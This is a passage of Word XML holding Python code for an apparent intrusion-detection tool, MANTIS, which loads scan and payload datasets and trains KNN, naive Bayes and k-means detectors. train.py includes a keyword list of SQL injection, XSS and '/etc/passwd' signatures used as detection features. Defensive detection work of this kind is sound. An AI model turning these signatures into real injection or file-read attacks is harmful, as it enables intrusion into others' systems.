    </w:p>
    <w:p w14:paraId="5EBE4BA8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45695C2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load_knn_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760007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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A23E57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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E27DD5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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A62AF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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E6BB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raise DatasetError(path + ": empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAD03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 = {c.lower().strip(): c for c in r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546056C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need in ("unique_ports", "packet_count", "label"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEED4D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need not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B66D6F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raise DatasetError(path + ": missing column " + need)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3351FD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 row in enumerate(r, start=2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6899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26D1EA0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ports = int(float(row[h["unique_ports"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0BA75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pkts = int(float(row[h["packet_count"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001FB98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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1D52B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raise DatasetError("%s:%d bad number" % (path, i))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFB65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out.append([ports, pkts, normalise_label(row[h["label"]])])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267246C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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09131C3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raise DatasetError(path + ": no rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2D1E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out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FCBB04" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="289F4898" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01B0B54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load_payload_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7327384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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A649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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005F425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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6181DB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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDB190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raise DatasetError(path + ": empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695BEE9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 = {c.lower().strip(): c for c in r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DC266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"payload" not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B98B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raise DatasetError(path + ": need payload,label columns")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572A21D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row in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06611B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out.append((row[h["payload"]] or "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566CF5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normalise_label(row[h["label"]])))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1BDA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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209688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raise DatasetError(path + ": no rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A030D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out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722EAE3B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03DEF7FC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BDC3D6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load_kmeans_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2CCE3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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EF20F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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D084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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7C4F8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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E04D03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raise DatasetError(path + ": empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B532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 = {c.lower().strip(): c for c in r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275FA5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if "pps" not in h or "unique_ports" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5FFE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raise DatasetError(path + ": kmeans CSV requires 'pps' and 'unique_ports' columns.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAE7A0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 row in enumerate(r, start=2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8C072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02FB4E3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out.append([float(row[h["pps"]]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF569A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float(row[h["unique_ports"]])])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE310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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F5224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raise DatasetError("%s:%d bad number" % (path, i))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E30E2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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646E00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raise DatasetError(path + ": no rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B206F4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out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565A4F09" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6196EE80" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7648835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load_cic_iot2023(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E4389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MANTIS KNN consumes one-second aggregate counts, not raw port numbers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5CB0E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 previous loader incorrectly substituted "Dst Port" for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFC88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"unique_ports" and labeled every attack family as Scan. That produced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25173C5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invalid training points such as [0 ports, packets, Scan].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0772A27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knn_rows, km_rows = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D0307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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DFE84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 = csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDF85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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361ADE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raise DatasetError(path + ": empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC3C29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cols = {c.strip().lower(): c for c in r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540D59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label_col = cols.get("label") or cols.get("attack")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3134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pkts_col = (cols.get("tot fwd pkts") or cols.get("totfwdpkts")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DAED77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or cols.get("tot sum") or cols.get("packet_count")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778CC3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or cols.get("packets"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4810A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ports_col = cols.get("unique_ports")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB4FD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label_col or not pkts_col:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037EBD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raise DatasetError(path + ": need Label + packet count col")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3037AA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ports_col:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628BCE5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raise DatasetError(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2877BF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path + ": CIC rows must be pre-aggregated with a "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E9B26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"'unique_ports' column; 'Dst Port' is a port number, not a "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646D57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"count of scanned ports")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B66A0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row in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0EAB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73D3F5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pkts = int(float(row[pkts_col] or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257F0F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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16943AF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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA7E7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777A78F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ports = int(float(row[ports_col] or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3080A40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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522289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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12067F1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pkts &lt; 0 or ports &lt; 0 or ports &gt; pkts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E475A0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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32554D8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lbl = normalise_label(row[label_col])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8C1A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This is a scan-vs-not-scan classifier. DDoS, payload attacks,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E0530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and other attack families are negative examples, not scans.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DECA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tag = "Scan" if lbl == "Scan" else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381CB31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knn_rows.append([ports, pkts, tag])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400EE83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km_rows.append([float(pkts), float(ports)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EEC6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knn_rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614295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raise DatasetError(path + ": no usable rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5270867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{"knn": knn_rows, "kmeans": km_rows}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E32BD8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4315C22E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34C727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load_json(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575047B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os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDCCE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raise DatasetError("file not found: " + path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFCA1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open(path, "r", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BE99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331493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json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3767BB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json.JSONDecodeError as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2193B21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raise DatasetError(path + ": bad JSON (%s)" % e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A25202F"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src/training/train.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D508B82" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>168 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5604CB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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F810F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trains mantis engines from a csv/json dataset and writes mantis_brain.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B0360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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E15003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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B5D9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math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696230B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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F2BB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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591CC9C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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407674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from collections import Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6D653A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4ED124F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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488492E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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2104094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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E491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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059F8803" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54318E5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from training import loader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2E82BD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F5A4C0C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76245BD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KEYWORDS = ["UNION", "SELECT", "SLEEP", "DROP", "INSERT", "UPDATE",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE3840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"OR 1=1", "SCRIPT", "ALERT(", "/ETC/PASSWD"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124D8479" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42DFCDC7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EE6317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train_knn(rows, max_samples=5000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0005A5B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KNN is lazy - just keep the labelled points. Trim if huge.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B20E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len(rows) &gt; max_samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E436B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buckets = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E142B3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r in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CA351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buckets.setdefault(r[2], []).append(r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1664A7D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per = max(1, max_samples // max(1, len(buckets)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E87210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kept = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110A8EB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items in buckets.values():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D11CA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step = max(1, len(items) // per)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8F06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kept.extend(items[::step][:per])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF4376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rows = kept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FDB8B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counts = Counter(r[2] for r in rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA51A7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print("[KNN] %d samples %s" % (len(rows), dict(counts)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF4AE4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{"k": 3, "training_data": rows}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCEC76A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36C4FD62" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E39643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train_naive_bayes(rows, keywords=None, laplace=1.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC603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keywords = keywords or KEYWORDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59793D5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n_mal = sum(1 for _, l in rows if l in {"Malicious", "Attack"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B34394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n_safe = sum(1 for _, l in rows if l == "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D865B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n_mal == 0 or n_safe == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667E3B6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raise ValueError("payload set must have both classes")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B967F0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AD5184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likelihoods = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1187E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w in keywords:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77978B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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD06F0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 in {"Malicious", "Attack"} and w in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563FD6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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A13E0F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 == "Normal" and w in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17AAF5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laplace smoothing so we never get zero</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148B5ED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p_mal = (m + laplace) / (n_mal + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C316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p_safe = (s + laplace) / (n_safe + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7448103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likelihoods[w] = (round(p_mal, 6), round(p_safe, 6))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA376F0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19167E0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prior_mal = n_mal / (n_mal + n_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EED85C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print("[NB ] %d payloads (mal=%d safe=%d) prior=%.3f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49329FE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(len(rows), n_mal, n_safe, prior_mal))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362C3A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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BED11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"prior_malicious": round(prior_mal, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086835A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"prior_safe": round(1 - prior_mal, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DFEAE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"likelihoods": likelihoods,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4943EE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E18B00C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2426942D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="770F57B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train_kmeans(points, k=3, iters=25):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A3F6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len(points) &lt; k:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07428D4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raise ValueError("need &gt;= %d points" % k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F327C1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spread initial centroids across the data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED03B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step = max(1, len(points) // k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45887F7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cents = [list(points[i * step]) for i in range(k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="208EAE68" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CC58BC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d(a, b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618FE30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math.sqrt(sum((x - y) ** 2 for x, y in zip(a, b)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6806456F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53A299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_ in range(iters):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF1403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groups = [[] for _ in range(k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0538E27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p in points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72556F7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groups[min(range(k), key=lambda i: d(p, cents[i]))].append(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A2C9F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moved = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2B653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 g in enumerate(groups):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD7EB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g:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F659CD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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583E1A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new = [sum(m[j] for m in g) / len(g) for j in range(len(g[0]))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617E194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moved += d(cents[i], new)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9D24E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cents[i] = new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509D261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moved &lt; 1e-3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CAB2A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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7634349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print("[KM ] %d centroids on %d points: %s" % (k, len(points), cents))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD163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{"k": k, "alpha": 0.05, "centroids": cents}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD8D66E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BA70770" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41D5267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write_brain(path, brain):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293231E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os.makedirs(os.path.dirname(path) or ".", exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B0152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base = path[:-5] if path.endswith(".json") else path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F28242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 = "%s_%s.json" % (base, time.strftime("%Y%m%d_%H%M%S"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5200B63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open(out, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005BADC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json.dump(brain, f, indent=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58269BE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saved", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3813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out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E58FBB7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
